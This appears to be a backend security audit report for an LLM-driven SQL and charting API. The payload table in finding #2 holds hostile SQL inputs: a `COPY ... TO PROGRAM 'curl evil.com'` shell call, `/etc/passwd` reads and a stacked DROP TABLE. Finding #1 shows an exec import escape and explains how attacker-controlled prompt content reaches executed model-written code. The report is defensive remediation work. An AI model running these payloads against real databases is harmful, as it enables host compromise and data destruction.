# Backend audit — issues found and fixes applied

Audit of the AskGraph backend API (2026-08-29). The deployed service is
`app2:app` (per `Dockerfile` CMD), backed by `models`, `database_manager`,
`cache_manager`, `ai_service`, `viz_service`, `utils` and `config`.

All 16 findings below are fixed. Verify with:

```bash
python test_backend.py     # 9 regression checks, no DB or API calls needed
```

> **⚠️ Two manual steps this code cannot do for you — see
> [Still outstanding](#still-outstanding). Rotate the leaked credentials.**

---

## Critical

### 1. Remote code execution via generated chart scripts

**Where:** `viz_service.py:69` (old) — `exec(py_script, exec_globals)`

`/generate` and `/gen-dashboard` ask Gemini for a Python plotting script and
`exec()` it. The old `safe_exec_globals()` returned `{"pd", "plt", "sns",
"exit", "quit", "print"}` and shadowed `exit`/`quit` only.

The hole: **CPython injects the real `__builtins__` into any globals dict that
doesn't define the key.** Verified during the audit:

```python
exec('import os; print(os.getcwd())', {'pd': 1, 'exit': 2})   # runs fine
```

So `__import__('os').system(...)` was reachable. The prompt is built from
`req.query` *and from the row content of the queried database*, both
attacker-controllable, on an endpoint with no authentication and
`allow_origins=["*"]`.

**Fix:** pin an explicit `__builtins__` safelist (~35 names that plotting code
actually uses) and shadow `__import__`, `open`, `eval`, `exec`, `compile`,
`input`, `globals`, `vars`, `breakpoint` with a raising stub. The viz prompt now
states imports are unavailable, so the model stops emitting them. A generated
script that ignores this raises `NameError`, which the existing retry loop
already handles as an ordinary viz failure.

**Covered by:** `test_exec_sandbox_blocks_imports`,
`test_exec_sandbox_still_runs_plotting`

**Residual risk:** a builtins safelist is a speed bump, not a jail — Python
sandbox escapes via object-graph traversal (`().__class__.__mro__`) are a known
class of bypass. The durable fix is running generated plots in a separate
process with a seccomp/container boundary. Marked in the code as
`ponytail:` debt on the plotting path.

---

### 2. Safe mode was a substring scan, not a parser

**Where:** `ai_service.py:56-60` (old)

```python
forbidden = ["insert","update","delete","drop","alter","truncate","grant","revoke"]
return not any(word in sql_query.lower() for word in forbidden)
```

Measured behaviour before the fix:

| Query | Old result | Should be |
|---|---|---|
| `SELECT * FROM updates` | **blocked** | allow |
| `SELECT * FROM t WHERE note='delete me'` | **blocked** | allow |
| `COPY (SELECT 1) TO PROGRAM 'curl evil.com'` | **allowed** | block — Postgres shell exec |
| `SELECT pg_read_file('/etc/passwd')` | **allowed** | block — host file read |
| `SELECT lo_import('/etc/passwd')` | **allowed** | block |
| `CREATE TABLE x AS SELECT 1` | **allowed** | block |
| `DO $$ ... $$` | **allowed** | block |
| `SELECT 1; DROP TABLE users` | **allowed** | block — statement stacking |

This was a **regression**: the earlier `app.py:180` used
`sqlglot.parse_one` + an `isinstance(parsed, (exp.Select, exp.With))` check, and
`copy_of_postgres.py` already contained a complete set of dialect-aware
guardrails. The refactor replaced working parser logic with a keyword list.

**Fix:** new `sql_guard.py`, built from the guardrails already in the repo.
`is_read_only(sql, dialect)` requires that the statement parses, is **exactly
one** statement, is a `Select`/`With`/`Union`/`Subquery`, contains no write node
anywhere in the tree (catches `WITH x AS (DELETE ... RETURNING *)`), calls no
filesystem/shell function (`pg_read_file`, `lo_import`, `dblink`, `xp_cmdshell`,
`utl_file`, …), and avoids per-dialect unsupported syntax. Fails closed on any
parse error. `sqlglot` was already in `requirements.txt`.

Two call sites now enforce it:
- `/generate` — when `safe_mode` is on (unchanged contract).
- `/gen-dashboard` — **always**. Dashboard SQL is model-written and never seen
  by a human before execution, so it is held to read-only regardless.

**Covered by:** `test_guardrail_allows_real_queries`,
`test_guardrail_blocks_bypasses` (14 payloads)

---

### 3. Live credentials committed to the repo — in four places

| Location | Secret |
|---|---|
| `config.py:16` | Neon connection string incl. password `npg_UCdk9…` |
| `copy_of_postgres.py:23,24` | two Gemini API keys `AIzaSyDBnJ…`, `AIzaSyD9qR…` |
| **`frontend/app.js:823`** | the same Neon password, **served to every browser** |
| `test_curls.md` | the same Neon password, ×6 |
| `test_db_connection.py:8` | the same Neon password |

Commit `8daaa67` ("Remove secrets and macOS junk from version control") missed
all six. The frontend one is the worst: it was live on the public site, so
anyone who opened DevTools had the database password.

**Fix:**
- `config.py` — `CACHE_DB_URL` is now a required field with **no default**. A
  committed fallback is a committed password, and it also means a missing env
  var silently points production at someone's dev database.
- `copy_of_postgres.py` — deleted outright (see finding #16).
- `test_curls.md` — DSNs replaced with `USER:PASSWORD@HOST` placeholders.
- `test_db_connection.py` — now reads `CACHE_DB_URL` from the environment.
- `frontend/app.js` — the dropdown now emits `preset:<dbname>`. A validator on
  the shared request model (`models._DbRequest`) expands it server-side against
  `CACHE_DB_URL` via `utils.resolve_db_url`. **The connection string never
  reaches the browser.** `/databases` still returns names only.

**Covered by:** `test_preset_resolution_keeps_password_server_side`

> These values are still in git history. Redacting the working tree does not
> un-publish them — **rotate both Gemini keys and the Neon password.**

---

### 4. Database passwords returned to HTTP clients

**Where:** `database_manager.py:15,24,55,123` (old) —
`detail=f"Database Error: {str(e)}"`

psycopg2 and SQLAlchemy embed the full DSN in connection errors, so any caller
who triggered a connection failure got the credentials back in the 400 body.

**Fix:** `utils.redact()` rewrites `://user:pass@` to `://***:***@`. Applied to
every error string that reaches a client *or a log line*. Host and error text
are preserved so the message stays useful. Verified live:

```
POST /schemas {"db_url": "postgresql://bob:hunter2@127.0.0.1:1/x"}
→ 400  "hunter2" in response body: False
```

**Covered by:** `test_redact_strips_credentials`

---

## Resource exhaustion

### 5. A leaked connection pool on every request

**Where:** `database_manager.py:9-15` (old) — `create_engine` per call, never
`dispose()`d.

Every `/schemas`, `/generate`, and each of the 5 charts in `/gen-dashboard`
built a fresh SQLAlchemy `Engine`, each with its own pool. Pools accumulated
until the target database refused new connections.

**Fix:** `@lru_cache(maxsize=32)` on a module-level `_build_engine`. Measured:

```
50 get_engine calls -> 1 distinct engine   (was 50)
lru stats: hits=49, misses=1, currsize=1
```

`postgres://` is normalised to `postgresql://` *before* the cache lookup so the
alias doesn't defeat it.

### 6. No timeouts anywhere

No `connect_timeout` on `create_engine`, no timeout on Gemini calls. The
endpoints are sync `def`, so each runs on Starlette's threadpool (default 40
slots) — 40 hung DB connects and the service is gone. Compounded by #5.

**Fix:** `DB_CONNECT_TIMEOUT` (10s) in `connect_args` per driver,
`AI_TIMEOUT_SECONDS` (120s) via `types.HttpOptions(timeout=…)` on the Gemini
client, plus `pool_pre_ping=True` and `pool_recycle=1800` so connections the DB
dropped while idle don't surface as request errors. All tunable via `.env`.

### 7. matplotlib global state shared across threads

**Where:** `viz_service.py:30-31,67,111` (old)

`plt` is process-global. `matplotlib.use()`, `plt.switch_backend()` and
`plt.close('all')` were called from concurrent threadpool workers, so two
simultaneous `/generate` calls could steal each other's figures.
`/gen-dashboard` runs five in a row.

**Fix:** a module-level `threading.Lock` around exec + savefig + read-back. The
redundant per-call `use()`/`switch_backend()` are gone (the backend is set at
import and by `MPLBACKEND=Agg` in the Dockerfile). Marked `ponytail:` — a
process pool is the upgrade if chart throughput ever matters.

### 8. Unbounded page size

**Where:** `models.py:48` (old) — `limit: int = 100`, no constraint.

`{"limit": 10000000}` made `pd.read_sql` pull an entire table into memory. A
negative limit produced `LIMIT -5` and a driver error. `page` was clamped in the
endpoint; `limit` was not.

**Fix:** `Field(100, ge=1, le=settings.MAX_PAGE_SIZE)` and `Field(1, ge=1)`.
Rejected at the model boundary with a 422 before any SQL runs. Verified:

```
POST /schemas/updates/data {"limit": 10000000}
→ 422  "Input should be less than or equal to 1000"
```

**Covered by:** `test_pagination_limit_is_bounded`

### 9. Full-table DISTINCT scan on every new connection

**Where:** `database_manager.py:69` (old)

```python
result = conn.execute(text(f"SELECT DISTINCT {item['column']} FROM {item['table']}")).fetchall()
vals = [str(row[0]) for row in result[:10] ...]     # LIMIT applied in Python
```

A full distinct scan of every categorical column, with 10 rows kept and the rest
discarded. The older `app.py:171` had `LIMIT 10` in SQL — another refactor
regression. The same line also interpolated model-supplied table and column
names straight into SQL.

**Fix:** `LIMIT :lim` as a bound parameter, and identifiers are now whitelisted
against the live schema (`inspector.get_table_names()` /
`get_columns()`) *and* dialect-quoted via `DatabaseManager.quote()` before
reaching a query string.

### 10. Schema cache never expired

`cache_manager` wrote `updated_at` and never read it. A migration on a target
database poisoned every subsequent prompt with a stale schema, permanently —
with no way to bust it short of manual SQL against the cache DB.

**Fix:** `SCHEMA_CACHE_TTL_HOURS` (default 24) enforced in the `SELECT`, plus a
`POST /cache/invalidate` endpoint for forcing a refetch after a known migration.

### 11. Four TCP+TLS connects per request to the cache DB

Every cache read and write opened and closed its own connection to Neon.

**Fix:** a `ThreadedConnectionPool` (1–5) behind a `_conn()` context manager.
Read paths `rollback()` so no idle transaction is returned to the pool.

---

## Correctness

### 12. Dialect detected by substring-matching the whole URL

**Where:** `utils.py:6-10` (old) — `if "postgres" in db_url: return "postgres"`

It searched the entire URL **including the password**. A Postgres password
containing `oracle` silently switched the dialect, changing generated SQL and
pagination syntax.

**Fix:** `urlparse(db_url).scheme`, split on `+` to drop the driver suffix
(`mysql+pymysql` → `mysql`), mapped through an explicit table.

**Covered by:** `test_dialect_from_scheme_not_substring`

### 13. Inconsistent error contract

`/schemas` raised 400; `/generate` returned **200** with an `error` field;
`/schemas/{t}/data` did both depending on which branch failed; `/databases`
returned `{"error": …}` with **200**. The frontend had to check status *and*
body on every call.

**Fix:** data endpoints (`/schemas*`, `/databases`, `/optimize`) raise
`HTTPException` consistently — the frontend's `apiCall` already surfaces
`detail` and every call site is wrapped in try/catch (verified in
`frontend/app.js:331,505`). The two long-running AI endpoints (`/generate`,
`/gen-dashboard`) keep 200-with-`error`, because the frontend renders partial
results (the generated SQL) alongside the error and that behaviour is
deliberate.

### 14. Gemini key rotation also downgraded the model

**Where:** `ai_service.py:19-22` (old) — `_init_client` advanced the key cycle
*and* the model cycle together.

A single 429 on key 1 permanently moved every later request to a weaker model
with no path back. Separately, `itertools.cycle([])` with zero configured keys
raised a bare `StopIteration` at import. And `self.client` was mutated from
threadpool workers with no lock.

**Fix:** the model is pinned to `MODELS[0]` and only steps down after *every*
key has been tried at that model. Constructor raises a clear `ValueError` when
no keys or models are configured. Rotation is guarded by a `threading.Lock`.

**Covered by:** `test_ai_service_rejects_empty_keys`

### 15. SQLite engines crashed on pool arguments

Found by the regression suite while verifying #5: SQLite uses
`SingletonThreadPool`/`StaticPool`, which reject `pool_size`/`max_overflow`.
`create_engine` raised a `TypeError` surfaced as a 400.

**Fix:** queue-sizing kwargs are applied only for non-SQLite dialects.

---

## Cleanup

### 16. Dead code, image bloat, dead statements

- **~1,400 lines not imported by the service**: `app.py` (415), `app1.py` (388)
  — both re-declaring the models `models.py` owns — and `copy_of_postgres.py`
  (585), a Colab export that called `main()` (an `input()` loop) at module
  scope, so any import of it would hang.
- **Dockerfile** installed `build-essential`, `gcc` and `libpq-dev` to compile
  nothing: `psycopg2-binary` and every other pinned dep ship manylinux wheels.
  ~300MB and a large CVE surface for zero benefit.
- `load_dotenv()` in `app2.py:30` was redundant — pydantic-settings already
  reads `.env`. `os.makedirs(FRONTEND_DIR)` at line 60 could never fire.
- The compose healthcheck probed `/`, tying liveness to the frontend file.

**Fix:** `app.py`, `app1.py` and `copy_of_postgres.py` are **deleted**
(`git rm`). Nothing imported them; `app2:app` boots and the suite passes without
them. They are recoverable from git history if ever needed — note that the
history copies still contain the unrotated secrets from finding #3.

Also: compiler packages dropped from the Dockerfile and the container now runs
as non-root (uid 10001); redundant `load_dotenv()` and `os.makedirs()` removed;
added a real `GET /health` that touches neither the DB nor Gemini.

---

## Still outstanding

Two items need a decision or an action outside this codebase:

1. **Rotate the leaked credentials.** Both Gemini API keys and the Neon
   password are in git history. Redaction in the working tree does not revoke
   them. This is the one fix that code cannot make.

2. **The API has no authentication.** Every endpoint is open, with
   `allow_origins=["*"]`, on a public hostname. Anyone can submit a `db_url` and
   have the server connect to it — including hosts on the VPS's internal
   `deploy_default` Docker network that aren't otherwise reachable (SSRF-shaped:
   the service is a connection proxy into your private network). The fixes above
   shrink the blast radius; they don't close this. It needs a product decision —
   an API key, a session, or an allowlist of connectable hosts.

---

## Files changed

| File | Change |
|---|---|
| `sql_guard.py` | **new** — parser-based read-only guardrail |
| `test_backend.py` | **new** — 9 regression checks |
| `viz_service.py` | builtins safelist; plot lock; prompt rules |
| `ai_service.py` | guardrail swap; key-only rotation; lock; timeout; config validation |
| `database_manager.py` | engine cache; timeouts; redaction; DISTINCT limit; identifier whitelist+quote |
| `cache_manager.py` | TTL; connection pool; `invalidate()` |
| `models.py` | shared `_DbRequest` + preset validator; bounded pagination; length caps |
| `config.py` | required `CACHE_DB_URL`; timeout/TTL/limit settings |
| `utils.py` | scheme-based dialect; `redact()`; `resolve_db_url()`; sha256 hash |
| `app2.py` | `/health`, `/cache/invalidate`; `_load_schema` helper; consistent errors; dashboard guardrail |
| `frontend/app.js` | removed hardcoded DB password; sends `preset:<name>` |
| `Dockerfile` | dropped compilers; non-root user |
| `.dockerignore` | excludes tests and archives |
| `.env.example` | documents required vars and new limits |
| `app.py`, `app1.py`, `copy_of_postgres.py` | **deleted** — dead code, ~1,400 lines |
| `test_curls.md`, `test_db_connection.py` | credentials replaced with placeholders / env var |

`get_hash` moved from MD5 to SHA-256. Cache keys change, so the first request
per database after deploy refetches its schema once. No migration needed —
stale MD5 rows age out via the new TTL.
